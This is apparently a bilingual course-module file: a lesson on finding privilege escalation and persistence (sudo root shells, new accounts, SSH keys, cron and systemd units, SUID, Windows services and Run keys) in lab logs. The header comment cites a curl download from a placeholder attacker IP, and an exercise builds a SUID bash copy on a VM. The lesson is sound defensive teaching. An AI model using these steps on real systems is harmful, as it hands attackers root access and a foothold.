/**
 * 14.3 — Leo thang quyền và bám trụ (soạn 24/11/2026, agent lgz). Output thật: OUT['s14/leo-thang'] — vu14 (tao-vu.py) + EVTX công khai (jump01 user-4720/admin-4732, fs01 apt-4720-4698, fs02 svc-7045, MSEDGEWIN10 runkey-sysmon13).
 * Số tất định: sudo 20 × "systemctl restart shop" (đường nền) + 1 × "COMMAND=/usr/bin/bash" (deploy) + 1 × an "restart rsyslog"; sysupdate UID 1003 02:16:02, vào sudo 02:16:05, đổi mật khẩu 02:16:11;
 * auditd 4 khoá: ssh_keys 02:17:10 /root/.ssh/authorized_keys, tai_ve 02:18:40 curl http://203.0.113.77:8000/k, cron 02:19:05 /etc/cron.d/dbus-sync, systemd 02:20:12 dbus-sync.service — tất cả auid=1001;
 * CONFIG_CHANGE audit_enabled=0 02:22:30 (auid 1001) / =1 09:29:31 (auid 1000); syslog Started dbus-sync 02:20:15, kworkerd 110 lần (mỗi 5 phút từ 02:25);
 * Windows: jump01 05:12:58 4720 hacking-local-acct → Users, 05:14:30 Administrators, 05:14:44 Backup Operators (admmig); fs01 2 × 4720 (WADGUtilityAccount, elie) + 4698 \Microsoft\SynchronizeTimeZone Command "adf";
 * fs02 7045 bad-task "virusé.exe" LocalSystem; Sysmon 13 Run\ = "c:\windows\tasks\taskhost.exe" bởi C:\Users\Public\tools\evasion\a.exe.
 */
import { lenh, nguon, lienKet, kv } from '../_chung.mjs';

export default {
  title: '14.3 — Traces of privilege escalation and persistence: new admin, sudo, new service, scheduled task, cron, SUID, startup items|||14.3 — Dấu vết leo thang quyền và bám trụ: admin mới, sudo, dịch vụ mới, tác vụ hẹn giờ, cron, SUID, mục khởi động',
  slug: 'log-14-3-leo-thang',
  type: 'LESSON',
  isFreePreview: true,
  description: 'Vào được rồi, kẻ tấn công cần hai thứ: quyền cao hơn (leo thang) và cách quay lại dù bị đổi mật khẩu (bám trụ). Bài này lần theo web01 sau lần đăng nhập 02:14: sudo khác hẳn đường nền ("bash" thay vì "systemctl restart shop"), tài khoản sysupdate vào nhóm sudo, khoá SSH cho root, tải công cụ bằng curl, cron + systemd giả tên dịch vụ hệ thống — và vì sao trường auid của auditd vẫn chỉ đúng "deploy" dù mọi lệnh chạy dưới root. Phần Windows dùng mẫu công khai: tài khoản mới vào Administrators (4720→4732), tác vụ hẹn giờ giả tên Microsoft (4698), dịch vụ chạy tệp lạ (7045), khoá Run do Sysmon 13 ghi.',
  content: `
<div class="ml-en">
<span class="eyebrow">Chapter 14 · Lesson 14.3</span>
<h2>After the door: higher rights, and a way back in</h2>
<p class="lead">A stolen password can be changed tomorrow. So right after getting in, attackers do two things: <strong>escalate</strong> (become root/Administrator) and <strong>persist</strong> (plant something that lets them return or keeps running: a new account, an SSH key, a cron job, a service, a scheduled task, a Run key). Each of these is a <em>change</em> to the system — and changes are what good logs record.</p>

<h3>The everyday picture</h3>
<p>The thief who got into the apartment does not just take the TV. He copies the key, adds his name to the residents' list, and leaves a window unlatched. The building's logbook ("new resident registered", "key copied at the locksmith") is how you find out.</p>

<h3>Step 1 — sudo that does not look like this account</h3>
${lenh('s14/leo-thang', 0)}
<p>Baseline (14.2) for <code>deploy</code>: one sudo command, 20 times — restart the shop. New: <code>COMMAND=/usr/bin/bash</code>, a root shell. That one line is privilege escalation (ATT&amp;CK T1548.003, Sudo). The weakness was configuration: <code>deploy</code> was in group <code>sudo</code> with its own password — once the password was sprayed, root came free. The fix is a sudoers rule that allows only <code>/usr/bin/systemctl restart shop</code>.</p>

<h3>Step 2 — a new account in the sudo group</h3>
${lenh('s14/leo-thang', 1)}
<p>Four lines in 9 seconds: create <code>sysupdate</code> (a name chosen to look boring), add it to <code>sudo</code>, set its password. Even if <code>deploy</code>'s password is changed, the attacker keeps root (T1136.001 + T1098).</p>

<h3>Step 3 — auditd: what was touched, and by whom really</h3>
<p>auth.log does not see files being written. auditd does, if you asked it to (Lesson 8.4). web01 had these watch rules:</p>
<pre><code class="language-bash"># /etc/audit/rules.d/50-lab.rules (excerpt) — -w = watch a path, -p wa = writes and attribute changes, -k = key to search by
-w /root/.ssh -p wa -k ssh_keys
-w /etc/cron.d -p wa -k cron
-w /var/spool/cron -p wa -k cron
-w /etc/systemd/system -p wa -k systemd
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/curl -k tai_ve
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/wget -k tai_ve</code></pre>
${lenh('s14/leo-thang', 2)}
${lenh('s14/leo-thang', 3)}
${lenh('s14/leo-thang', 4)}
<p>Four keys, four persistence steps, three minutes: an SSH key for root (T1098.004), a tool downloaded with curl from the spraying IP (T1105), a file in <code>/etc/cron.d</code> (T1053.003), a systemd unit (T1543.002). And every record says <strong>auid=1001</strong>: the <em>audit user id</em> is set at login and survives <code>sudo</code>, so even though uid=0 (root) did the work, auditd remembers the human session it came from — <code>deploy</code> (uid 1001 in auth.log). The last line before silence: <code>audit_enabled=0</code> at 02:22:30 — the attacker switched auditd off (Lesson 14.4).</p>
<div class="pitfall co-tieu-de"><p><strong>No rule, no record.</strong> The webshell <code>anh-2041.php</code> (14.5) was written at 02:29 into <code>/var/www/shop/uploads</code> — no audit rule watched that folder, and auditd was already off. Decide what to watch <em>before</em> the incident: SSH keys, sudoers, cron, systemd units, web roots, <code>/tmp</code> executions.</p></div>

<h3>Step 4 — the persistence actually runs</h3>
${lenh('s14/leo-thang', 5)}
${lenh('s14/leo-thang', 6)}
<p>The names are camouflage (T1036.004): <code>dbus-sync</code> sounds like part of D-Bus, <code>kworkerd</code> like a kernel worker thread (<code>kworker</code>). Real kernel threads never live in <code>/tmp/.x/</code>. Ask of every cron/service line: <em>is the program in a system path, owned by a package?</em> (<code>dpkg -S /path</code> / <code>rpm -qf /path</code>).</p>
<p><strong>SUID</strong> is the other Linux classic: a copy of bash with the setuid bit (<code>chmod u+s</code>) gives root to anyone who runs it. It leaves no line in auth.log; you catch it with an audit rule on <code>chmod</code>/<code>fchmodat</code> or with a periodic <code>find / -perm -4000</code> diff (Chapter 16's daily routine).</p>

<h3>Step 5 — the same story on Windows (public samples)</h3>
${lenh('s14/leo-thang', 7)}
<p>jump01: <code>admmig</code> creates <code>hacking-local-acct</code> (4720, which automatically adds it to Users — the first 4732), then adds it to <strong>Administrators</strong> and <strong>Backup Operators</strong> (backup operators can read any file, including the SAM hive). Lesson 4.2 decodes these events field by field.</p>
${lenh('s14/leo-thang', 8)}
${lenh('s14/leo-thang', 9)}
<p>fs01: two accounts, then a scheduled task hiding under <code>\\Microsoft\\</code> with a plausible name; the real command is in TaskContent (4698), not in the name.</p>
${lenh('s14/leo-thang', 10)}
${lenh('s14/leo-thang', 11)}
<p>A service whose image is an unknown .exe running as LocalSystem (7045), and a Run key written by a tool in <code>C:\\Users\\Public\\tools\\evasion</code> pointing to <code>c:\\windows\\tasks\\taskhost.exe</code> — a real Windows name in the wrong folder (T1547.001, T1036.005).</p>

${kv([
  ['Linux — escalation', 'sudo COMMAND outside baseline; sudo "NOT in sudoers"/"incorrect password"; new member of sudo/wheel; SUID changes.'],
  ['Linux — persistence', 'useradd/usermod; authorized_keys; /etc/cron.d, crontab REPLACE; new systemd unit + "Started …"; /etc/rc.local; shell profile changes.'],
  ['Windows — escalation', '4672 special privileges for a new account; 4732/4728 add to Administrators/Domain Admins.'],
  ['Windows — persistence', '4720 new user; 7045 new service; 4698 new task; Sysmon 13 Run/RunOnce keys; Sysmon 11 file in Startup folder.'],
  ['macOS — persistence', 'New LaunchAgent/LaunchDaemon plist; Background Task Management notifications (Chapter 6).'],
])}

<h3>🛡️ Attacker's corner</h3>
<p>ESET reported in May 2024 that the Ebury SSH backdoor had compromised about 400 000 Linux servers since 2009; one of its habits is hiding its own logins from the logs it can reach. The lesson for this chapter: persistence on Linux is quiet, so watch the <em>files</em> that grant access (keys, sudoers, PAM, cron, units) with auditd, and ship those records off the machine immediately.</p>
${nguon('📘', 'ESET WeLiveSecurity (5/2024) — Ebury is alive but unseen', '400 000 Linux servers compromised over 15 years', 'https://www.welivesecurity.com/en/eset-research/ebury-alive-unseen-400k-linux-servers-compromised-cryptotheft-financial-gain/')}

<h3>🎤 What an interviewer will ask</h3>
<ul>
<li>"An attacker became root with sudo. How do you know which human session it was?" — auditd <code>auid</code> survives sudo/su.</li>
<li>"Name five Linux persistence places and how you would log each." — authorized_keys, cron, systemd units, new users, SUID; auditd watches + auth.log.</li>
<li>"4720 then 4732 within two minutes on a server — what do you check?" — who (Subject), which group, was it a change ticket, what did the new account do (4624 with its name).</li>
</ul>

<h3>At work</h3>
<p>On a customer's VPS, "a new user appeared" is often a deployment script, not an attacker. Before raising an alarm, check the change log/ticket and the session that did it (auid, Subject). If no one can claim it within an hour, treat it as an incident.</p>

<h3>🧪 Practice (30 min)</h3>
<ol>
<li>Write the audit rule that would have recorded the webshell being written into <code>/var/www/shop/uploads</code>, with key <code>web_ghi</code>.</li>
<li>From the audit records, compute how many seconds passed between the root shell (USER_CMD) and audit being disabled.</li>
<li>On a Linux VM of yours: <code>sudo cp /bin/bash /tmp/b &amp;&amp; sudo chmod u+s /tmp/b</code> with an audit rule on <code>fchmodat</code>; find the record with <code>ausearch -k</code>; delete <code>/tmp/b</code>.</li>
</ol>

<h3>🗂 Key terms</h3>
${kv([
  ['Privilege escalation', 'Getting higher rights than the account you entered with.'],
  ['Persistence', 'A mechanism that lets the attacker come back or keeps their code running.'],
  ['auid', 'auditd\'s login user id; set at login, unchanged by sudo/su.'],
  ['Masquerading', 'Naming malicious things like legitimate ones (kworkerd, dbus-sync, \\Microsoft\\…).'],
  ['SUID', 'File permission bit that runs the program as its owner (root).'],
])}

<h3>📌 Summary</h3>
<ul>
<li>Compare sudo commands with the account's baseline.</li>
<li>Persistence is a change to accounts, keys, schedulers or services — log those paths before you need them.</li>
<li>Check names against paths: a "system" name in /tmp or the wrong folder is a red flag.</li>
</ul>
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-8-4-auditd', title: 'Lesson 8.4 — auditd', sub: 'Rules, keys, ausearch, auid', cta: 'Open' })}
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-4-2-tai-khoan-dac-quyen', title: 'Lesson 4.2 — Accounts and privileges', sub: '4720/4732/4672 field by field', cta: 'Open' })}
${lienKet({ khoa: 'blue-team-siem', bai: 'siem-6-4-leo-thang', title: 'Blue Team course › 6.4 Escalation and persistence on Linux', sub: 'Detection rules', cta: 'Open' })}
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 14 · Bài 14.3</span>
<h2>Sau cánh cửa: quyền cao hơn, và một lối để quay lại</h2>
<p class="lead">Mật khẩu bị trộm thì mai có thể đổi. Vì vậy ngay sau khi vào, kẻ tấn công làm hai việc: <strong>leo thang</strong> (thành root/Administrator) và <strong>bám trụ</strong> (cài một thứ giúp quay lại hoặc giữ mã của họ chạy mãi: tài khoản mới, khoá SSH, cron, dịch vụ, tác vụ hẹn giờ, khoá Run). Mỗi việc đó là một <em>thay đổi</em> trên hệ thống — và thay đổi chính là thứ log tốt ghi lại.</p>

<h3>Liên tưởng đời thường</h3>
<p>Tên trộm vào được căn hộ không chỉ lấy cái TV. Hắn đánh thêm chìa, ghi tên mình vào danh sách cư dân, và để hé một cửa sổ. Sổ của ban quản lý ("đăng ký cư dân mới", "đánh chìa ở tiệm") là cách bạn phát hiện.</p>

<h3>Bước 1 — sudo không giống tài khoản này</h3>
${lenh('s14/leo-thang', 0)}
<p>Đường nền (14.2) của <code>deploy</code>: một lệnh sudo duy nhất, 20 lần — khởi động lại cửa hàng. Mới: <code>COMMAND=/usr/bin/bash</code>, một shell root. Dòng đó là leo thang quyền (ATT&amp;CK T1548.003, Sudo). Điểm yếu nằm ở cấu hình: <code>deploy</code> thuộc nhóm <code>sudo</code> với chính mật khẩu của nó — mật khẩu bị rải trúng là có luôn root. Sửa đúng: luật sudoers chỉ cho phép <code>/usr/bin/systemctl restart shop</code>.</p>

<h3>Bước 2 — một tài khoản mới trong nhóm sudo</h3>
${lenh('s14/leo-thang', 1)}
<p>Bốn dòng trong 9 giây: tạo <code>sysupdate</code> (tên chọn cho thật nhàm chán), thêm vào <code>sudo</code>, đặt mật khẩu. Kể cả khi mật khẩu <code>deploy</code> bị đổi, kẻ tấn công vẫn giữ root (T1136.001 + T1098). Dòng <code>from=/dev/pts/1</code> cho biết lệnh gõ từ một terminal tương tác — không phải script cài đặt.</p>

<h3>Bước 3 — auditd: cái gì bị đụng, và thật ra là ai</h3>
<p>auth.log không thấy tệp bị ghi. auditd thấy, nếu bạn đã dặn nó (Bài 8.4). web01 có các luật theo dõi sau:</p>
<pre><code class="language-bash"># /etc/audit/rules.d/50-lab.rules (trích) — -w = theo dõi đường dẫn, -p wa = ghi và đổi thuộc tính, -k = khoá để tìm lại
-w /root/.ssh -p wa -k ssh_keys
-w /etc/cron.d -p wa -k cron
-w /var/spool/cron -p wa -k cron
-w /etc/systemd/system -p wa -k systemd
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/curl -k tai_ve
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/wget -k tai_ve</code></pre>
${lenh('s14/leo-thang', 2)}
${lenh('s14/leo-thang', 3)}
<p>Lệnh awk dài này làm việc mà <code>ausearch -i</code> làm trên máy thật: một sự kiện auditd gồm nhiều bản ghi (SYSCALL + PATH hoặc EXECVE) <strong>chung một số thứ tự</strong> trong <code>audit(giây:số)</code>; ghép chúng lại theo số đó, đổi giây Unix sang giờ VN. (Trong container không có gói tzdata nên dùng <code>TZ='&lt;+07&gt;-7'</code> — kiểu viết POSIX, dấu ngược: "-7" nghĩa là UTC+7.)</p>
${lenh('s14/leo-thang', 4)}
<p>Bốn khoá, bốn bước bám trụ, trong ba phút: khoá SSH cho root (T1098.004), công cụ tải bằng curl từ chính IP đã rải mật khẩu (T1105), một tệp trong <code>/etc/cron.d</code> (T1053.003), một unit systemd (T1543.002). Và mọi bản ghi đều có <strong>auid=1001</strong>: <em>audit user id</em> được gắn lúc đăng nhập và giữ nguyên qua <code>sudo</code>, nên dù uid=0 (root) làm việc, auditd vẫn nhớ phiên của con người đã sinh ra nó — <code>deploy</code> (uid 1001 trong auth.log). Dòng cuối trước khi im lặng: <code>audit_enabled=0</code> lúc 02:22:30 — kẻ tấn công đã tắt auditd (Bài 14.4).</p>
<div class="pitfall co-tieu-de"><p><strong>Không có luật thì không có bản ghi.</strong> Webshell <code>anh-2041.php</code> (14.5) được ghi lúc 02:29 vào <code>/var/www/shop/uploads</code> — không luật nào theo dõi thư mục đó, và auditd khi ấy đã tắt. Quyết định theo dõi gì <em>trước</em> khi có sự cố: khoá SSH, sudoers, cron, unit systemd, thư mục web, chương trình chạy từ <code>/tmp</code>.</p></div>

<h3>Bước 4 — thứ bám trụ thật sự chạy</h3>
${lenh('s14/leo-thang', 5)}
${lenh('s14/leo-thang', 6)}
<p>Tên là đồ nguỵ trang (T1036.004): <code>dbus-sync</code> nghe như một phần của D-Bus, <code>kworkerd</code> như luồng nhân <code>kworker</code>. Luồng nhân thật không bao giờ nằm ở <code>/tmp/.x/</code>. Hỏi với mỗi dòng cron/dịch vụ: <em>chương trình có nằm ở đường dẫn hệ thống, thuộc một gói cài đặt không?</em> (<code>dpkg -S /đường/dẫn</code> / <code>rpm -qf /đường/dẫn</code>).</p>
<p><strong>SUID</strong> là món kinh điển còn lại trên Linux: một bản sao bash có bit setuid (<code>chmod u+s</code>) trao root cho bất kỳ ai chạy nó. Nó không để lại dòng nào trong auth.log; bắt bằng luật auditd trên <code>chmod</code>/<code>fchmodat</code>, hoặc so <code>find / -perm -4000</code> định kỳ (nếp hằng ngày ở Chương 16).</p>

<h3>Bước 5 — cùng câu chuyện trên Windows (mẫu công khai)</h3>
${lenh('s14/leo-thang', 7)}
<p>jump01: <code>admmig</code> tạo <code>hacking-local-acct</code> (4720, tự động thêm vào Users — đó là 4732 đầu tiên), rồi thêm vào <strong>Administrators</strong> và <strong>Backup Operators</strong> (nhóm sao lưu đọc được mọi tệp, kể cả SAM). Bài 4.2 giải từng trường của các sự kiện này.</p>
${lenh('s14/leo-thang', 8)}
${lenh('s14/leo-thang', 9)}
<p>fs01: hai tài khoản, rồi một tác vụ hẹn giờ trốn dưới <code>\\Microsoft\\</code> với cái tên nghe rất hợp lý; lệnh thật nằm trong TaskContent (4698), không nằm ở tên.</p>
${lenh('s14/leo-thang', 10)}
${lenh('s14/leo-thang', 11)}
<p>Một dịch vụ chạy một .exe lạ dưới LocalSystem (7045), và một khoá Run do công cụ trong <code>C:\\Users\\Public\\tools\\evasion</code> ghi, trỏ tới <code>c:\\windows\\tasks\\taskhost.exe</code> — tên thật của Windows nhưng sai thư mục (T1547.001, T1036.005).</p>

${kv([
  ['Linux — leo thang', 'COMMAND của sudo ngoài đường nền; sudo "NOT in sudoers"/"incorrect password"; thành viên mới của sudo/wheel; SUID thay đổi.'],
  ['Linux — bám trụ', 'useradd/usermod; authorized_keys; /etc/cron.d, crontab REPLACE; unit systemd mới + "Started …"; /etc/rc.local; sửa profile của shell.'],
  ['Windows — leo thang', '4672 đặc quyền cho tài khoản mới; 4732/4728 thêm vào Administrators/Domain Admins.'],
  ['Windows — bám trụ', '4720 người dùng mới; 7045 dịch vụ mới; 4698 tác vụ mới; Sysmon 13 khoá Run/RunOnce; Sysmon 11 tệp trong thư mục Startup.'],
  ['macOS — bám trụ', 'plist LaunchAgent/LaunchDaemon mới; thông báo Background Task Management (Chương 6).'],
])}

<h3>🛡️ Góc hacker</h3>
<p>Tháng 5/2024, ESET công bố backdoor SSH Ebury đã chiếm khoảng 400 000 máy chủ Linux kể từ 2009; một thói quen của nó là giấu chính các lần đăng nhập của mình khỏi log mà nó với tới. Bài học cho chương này: bám trụ trên Linux rất lặng lẽ, nên hãy theo dõi các <em>tệp</em> trao quyền truy cập (khoá, sudoers, PAM, cron, unit) bằng auditd, và gửi các bản ghi đó ra khỏi máy ngay lập tức.</p>
${nguon('📘', 'ESET WeLiveSecurity (5/2024) — Ebury is alive but unseen', '400 000 máy chủ Linux bị chiếm trong 15 năm', 'https://www.welivesecurity.com/en/eset-research/ebury-alive-unseen-400k-linux-servers-compromised-cryptotheft-financial-gain/')}

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ul>
<li>"Kẻ tấn công lên root bằng sudo. Làm sao biết đó là phiên của người nào?" — <code>auid</code> của auditd giữ nguyên qua sudo/su.</li>
<li>"Kể năm chỗ bám trụ trên Linux và cách ghi log từng chỗ." — authorized_keys, cron, unit systemd, người dùng mới, SUID; luật auditd + auth.log.</li>
<li>"4720 rồi 4732 trong hai phút trên một máy chủ — bạn kiểm gì?" — ai làm (Subject), nhóm nào, có phiếu thay đổi không, tài khoản mới đã làm gì (4624 với tên đó).</li>
</ul>

<h3>Đi làm thật (outsourcing / OJT)</h3>
<p>Trên VPS của khách, "có người dùng mới xuất hiện" thường là script triển khai, không phải kẻ tấn công. Trước khi báo động, xem nhật ký thay đổi/phiếu và phiên đã làm việc đó (auid, Subject). Nếu sau một giờ không ai nhận, coi đó là sự cố.</p>

<h3>🧪 Thực hành (30 phút)</h3>
<ol>
<li>Viết luật auditd lẽ ra đã ghi lại việc webshell được ghi vào <code>/var/www/shop/uploads</code>, với khoá <code>web_ghi</code>.</li>
<li>Từ các bản ghi audit, tính bao nhiêu giây giữa shell root (USER_CMD) và lúc auditd bị tắt.</li>
<li>Trên máy ảo Linux của bạn: <code>sudo cp /bin/bash /tmp/b &amp;&amp; sudo chmod u+s /tmp/b</code> khi đã có luật auditd trên <code>fchmodat</code>; tìm bản ghi bằng <code>ausearch -k</code>; xoá <code>/tmp/b</code>.</li>
</ol>

<h3>🗂 Thuật ngữ</h3>
${kv([
  ['Leo thang quyền', 'Có quyền cao hơn tài khoản dùng để vào.'],
  ['Bám trụ (persistence)', 'Cơ chế giúp kẻ tấn công quay lại hoặc giữ mã của họ chạy.'],
  ['auid', 'ID người dùng đăng nhập của auditd; gắn lúc đăng nhập, không đổi qua sudo/su.'],
  ['Nguỵ trang (masquerading)', 'Đặt tên thứ độc hại giống thứ hợp lệ (kworkerd, dbus-sync, \\Microsoft\\…).'],
  ['SUID', 'Bit quyền khiến chương trình chạy dưới chủ sở hữu tệp (root).'],
])}

<h3>📌 Tóm tắt</h3>
<ul>
<li>So lệnh sudo với đường nền của tài khoản.</li>
<li>Bám trụ là thay đổi ở tài khoản, khoá, bộ hẹn giờ hay dịch vụ — ghi log các đường dẫn đó trước khi cần.</li>
<li>So tên với đường dẫn: tên "hệ thống" mà nằm ở /tmp hay sai thư mục là cờ đỏ.</li>
</ul>
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-8-4-auditd', title: 'Bài 8.4 — auditd', sub: 'Luật, khoá, ausearch, auid', cta: 'Mở bài' })}
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-4-2-tai-khoan-dac-quyen', title: 'Bài 4.2 — Tài khoản và đặc quyền', sub: '4720/4732/4672 từng trường', cta: 'Mở bài' })}
${lienKet({ khoa: 'blue-team-siem', bai: 'siem-6-4-leo-thang', title: 'Khoá Blue Team › 6.4 Leo thang và bám trụ trên Linux', sub: 'Quy tắc phát hiện', cta: 'Mở bài' })}
</div>
`,
};
